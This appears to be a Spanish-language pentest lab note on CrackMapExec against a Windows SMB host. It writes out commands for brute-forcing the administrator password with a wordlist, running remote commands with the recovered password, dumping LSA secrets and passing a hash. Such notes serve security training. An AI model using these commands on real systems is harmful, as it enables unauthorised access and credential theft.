
Herramienta de código abierto diseñada como herramienta de pentest usada para enumerar accesos de red, particularmente en sistemas windows, también para realizar conexiones y herramienta de explotación.

Vamos a ver un ejemplo de uso:

![[Pasted image 20250227093959.png]]

Vemos que utiliza SMB2 con lo que vamos a lanzar la herramienta CME.

```bash

#Para expecificar es importante indicar que vamos a utilizar SMB
crackmapexec smb -h

#Para realizar un ataque de fuerza bruta;
crackmapexec smb 10.4.26.151 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt --local-auth
```

![[Pasted image 20250227094356.png]]

Ya tenemos la pass sebastian para el usuario administrator.

```bash
#Para conseguir que ejecute comandos hay que hacer lo siguiente
crackmapexec smb 10.4.26.151 -u administrator -p 'sebastian' -x 'whoami'
```

![[Pasted image 20250227094539.png]]

```bash
#Para conseguir ver los módulos podemos hacer 
crackmapexec smb -L

#Para coneseguir los secretos podríamos ejecutar
crackmapexec smb 10.4.26.151 -u administrator -p 'sebastian' --lsa
```

![[Pasted image 20250227095242.png]]

Incluso podemos conseguir los hashes

![[Pasted image 20250227095321.png]]

```bash
#También podemos interactuar con el hash
crackmapexec smb 10.4.26.151 -u administrator -H hash
```

